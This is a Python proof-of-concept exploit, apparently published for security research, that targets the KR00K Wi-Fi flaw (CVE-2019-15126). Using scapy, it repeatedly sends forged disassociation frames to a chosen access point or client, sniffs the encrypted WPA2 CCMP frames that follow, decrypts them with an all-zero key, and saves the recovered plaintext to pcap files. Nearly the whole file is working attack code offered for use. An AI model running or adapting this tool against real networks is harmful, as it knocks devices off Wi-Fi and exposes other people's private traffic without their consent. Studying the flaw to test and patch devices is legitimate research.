# kr00ker
#
# Experimetal KR00K PoC in python3 using scapy
#
# Description:
# This script is a simple experiment to exploit the KR00K vulnerability (CVE-2019-15126),
# that allows to decrypt some WPA2 CCMP data in vulnerable devices.
# More specifically this script attempts to retrieve Plaintext Data of WPA2 CCMP packets knowning:
# * the TK (128 bites all zero)
# * the Nonce (sent plaintext in packet header)
# * the Encrypted Data
#
# Where:
# * WPA2 AES-CCMP decryption --> AES(Nonce,TK) XOR Encrypted Data = Decrypted Data
# * Decrypted stream starts with "\xaa\xaa\x03\x00\x00\x00"
# * Nonce (104 bits) = Priority (1byte) + SRC MAC (6bytes) + PN (6bytes)
#
# This PoC works on WPA2 AES CCMP with Frequency 2.4GHz WLANs.
#
# References:
# https://www.welivesecurity.com/wp-content/uploads/2020/02/ESET_Kr00k.pdf
#
#
# Copyright (C) 2020   Maurizio Siddu
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>





import argparse, threading
import datetime, sys, re
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from Crypto.Cipher import AES



# Proof of Sympathy ;-)
LOGO = """\
 __ _  ____   __    __  __ _  ____  ____
(  / )(  _ \ /  \  /  \(  / )(  __)(  _ \\
 )  (  )   /(  0 )(  0 ))  (  ) _)  )   /
(__\_)(__\_) \__/  \__/(__\_)(____)(__\_)
"""


KR00K_PATTERN = b'\xaa\xaa\x03\x00\x00\x00'


class Krooker:
    # Define Krooker class
    def __init__(self, interface, target_mac, other_mac, reason, num, delay):
        self.interface = interface
        self.target_mac = target_mac
        self.other_mac = other_mac
        self.reason = reason
        self.num = num
        self.delay = delay


    def wpa2_decrypt(self, enc_pkt):
        # Try to decrypt the data contained in the sniffed packet
        t_key = bytes.fromhex("00000000000000000000000000000000")
        # This check is redundant
        if not enc_pkt.haslayer(Dot11CCMP):
            return None
        dot11 = enc_pkt[Dot11]
        dot11ccmp = enc_pkt[Dot11CCMP]

        # Extract the Packet Number (IV)
        PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(dot11ccmp.PN5,dot11ccmp.PN4,dot11ccmp.PN3,dot11ccmp.PN2,dot11ccmp.PN1,dot11ccmp.PN0)
        # Extract the victim MAC address
        source_addr = re.sub(':','',dot11.addr2)
        # Extract the QoS tid
        if enc_pkt.haslayer(Dot11QoS):
            tid = "{:01x}".format(enc_pkt[Dot11QoS].TID)
        else:
            tid = '0'
        priority = tid + '0'
        # Build the nonce
        ccmp_nonce = bytes.fromhex(priority) + bytes.fromhex(source_addr) + bytes.fromhex(PN)

        # Finally try to decrypt wpa2 data
        enc_cipher = AES.new(t_key, AES.MODE_CCM, ccmp_nonce, mac_len=8)
        decrypted_data = enc_cipher.decrypt(dot11ccmp.data[:-8])
        return decrypted_data



    def disassociate(self):
        # Forge the dot11 disassociation packet
        dis_packet = RadioTap()/Dot11(type=0, subtype=12, addr1=self.target_mac, addr2=self.other_mac, addr3=self.other_mac)/Dot11Deauth(reason=self.reason)
        # Loop to send the disassociation packets to the victim device
        while True:
            # Repeat every delay value seconds
            time.sleep(self.delay)
            print("["+str(datetime.now().time())+"][+] Disassociation frames (reason "+str(self.reason)+") sent to target "+self.target_mac+" as sender endpoint "+self.other_mac)
            sendp(dis_packet, iface=self.interface, count=self.num, verbose=False)



    def check_packet(self, sniffed_pkt):
        # Filter for WPA2 AES CCMP packets containing data to decrypt
        if sniffed_pkt[Dot11].type == 2 and sniffed_pkt.haslayer(Dot11CCMP):
            # Uncomment this print line only for debug purposes
            #print("["+str(datetime.now().time())+"][DEBUG] packet tipe:"+str(sniffed_pkt[Dot11].type)+" sub:"+str(sniffed_pkt[Dot11].subtype))
            # Decrypt the packets using the all zero temporary key
            dec_data = self.wpa2_decrypt(sniffed_pkt)
            # Check if the target is vulnerable
            if dec_data and dec_data[0:len(KR00K_PATTERN)] == KR00K_PATTERN:
                print("\033[1;35;49m["+str(datetime.now().time())+"][+] Target "+self.target_mac+" is vulnerable to Kr00k, decrypted "+str(len(dec_data))+" bytes")
                hexdump(dec_data)
                # Save the encrypted and decrypted packets
                print("\033[0;39;49m;["+str(datetime.now().time())+"][+] Saving encrypted and decrypted 'pcap' files in current folder")
                dec_pkt = bytes.fromhex(re.sub(':','',self.target_mac) + re.sub(':','',self.other_mac)) + dec_data[6:]
                wrpcap("enc_pkts.pcap", sniffed_pkt, append=True)
                wrpcap("dec_pkts.pcap", dec_pkt, append=True)
                # Uncomment this if you need a one-shoot PoC decryption
                #sys.exit(0)
            #else:
                # Uncomment this print line only for debug purposes
                #print("["+str(datetime.now().time())+"][DEBUG] This data decryption with all zero TK went wrong")
                #pass



    def run_disassociation(self):
        # Run disassociate function in a background thread
        try:
            self.disassociate()
        except KeyboardInterrupt:
            print("\n["+str(datetime.now().time())+"][!] Exiting, caught keyboard interrupt")
            return





def main():
    # Passing arguments
    parser = argparse.ArgumentParser(prog="kr00ker.py", usage="%(prog)s -i <interface-name> -b <BSSID> -c <MAC-client> -n <num-packets> -r <reason-id> -t <target-id> -w <wifi-channel> -d <delay>")
    parser.add_argument("-i", "--interface", required=True, help="The Interface name that you want to send packets out of, it must be set in monitor mode", type=str)
    parser.add_argument("-b", "--bssid", required=True, help="The MAC address of the Access Point to test", type=str)
    parser.add_argument("-c", "--client", required=True, help="The MAC address of the Client Device to test", type=str)
    parser.add_argument("-n", "--number", required=False, help="The Number of disassociation packets you want to send (default 1)", type=int, default=1)
    parser.add_argument("-r", "--reason", required=False, help="The Reason identifier of disassociation packets you want to send (default 7)", type=int, default=7)
    parser.add_argument("-t", "--target", required=False, help="The Target identifier (default ap)", choices=["ap", "client"], type=str, default="ap")
    parser.add_argument("-w", "--wifi_channel", required=False, help="The WiFi channel identifier (default 1)", type=int, default="1")
    parser.add_argument("-d", "--delay", required=False, help="The delay for disassociation frames (default 4 seconds)", type=int, default="4")
    args = parser.parse_args()

    # Print the kr00ker logo
    print(LOGO)

    # Start the fun!!
    try:
        interface = args.interface
        ap_mac = args.bssid.lower()
        client_mac = args.client.lower()
        reason = args.reason
        target_channel = args.wifi_channel
        n_pkts = args.number
        delay = args.delay

        # Set the selected channel
        if target_channel in range(1, 14):
            os.system("iwconfig " + interface + " channel " + str(target_channel))
        else:
            print("["+str(datetime.now().time())+"][-] Exiting, the specified channel "+target_channel+" is not valid")
            exit(1)

        # Check if valid device MAC Addresses have been specified
        if client_mac == "ff:ff:ff:ff:ff:ff" or ap_mac == "ff:ff:ff:ff:ff:ff":
            print("["+str(datetime.now().time())+"][-] Exiting, the specified FF:FF:FF:FF:FF:FF broadcast MAC address is not valid")
            exit(1)

        # Check if a valid reason have been specified
        if reason not in range(1,99):
            print("Exiting, specified a not valid disassociation Reason ID: "+str(reason)+", accepted values from 1 to 99")
            exit(1)

        # Check if a valid delay have been specified
        if delay <= 0:
            print("Exiting, the specified delay is not valid")
            exit(1)

        # Set the MAC address of the target
        if args.target.lower() == "client":
            target_mac = client_mac
            other_mac = ap_mac
            print("["+str(datetime.now().time())+"][+] The Client device "+target_mac+" will be the target")
        else:
            target_mac = ap_mac
            other_mac = client_mac
            print("["+str(datetime.now().time())+"][+] The AP "+target_mac+" will be the target")

        # Krooker instance initialization
        krooker = Krooker(interface, target_mac, other_mac, reason, n_pkts, delay)

        # Start a background thread to send disassociation packets
        k_th = threading.Thread(target=krooker.run_disassociation)
        k_th.daemon = True    # This does not seem to be useful
        k_th.start()

        # Start packet interception
        s_filter = "ether src "+str(target_mac)+" and ether dst "+str(other_mac)+" and type Data"
        sniff(iface=krooker.interface, filter=s_filter, prn=krooker.check_packet)

    except KeyboardInterrupt:
        print("\n["+str(datetime.now().time())+"][!] Exiting, caught keyboard interrupt")
        k_th.join()
        sys.exit(0)

    except scapy.error.Scapy_Exception:
        print("["+str(datetime.now().time())+"][!] Exiting, your wireless interface seems not in monitor mode")
        sys.exit(1)



if __name__ == "__main__":
    main()
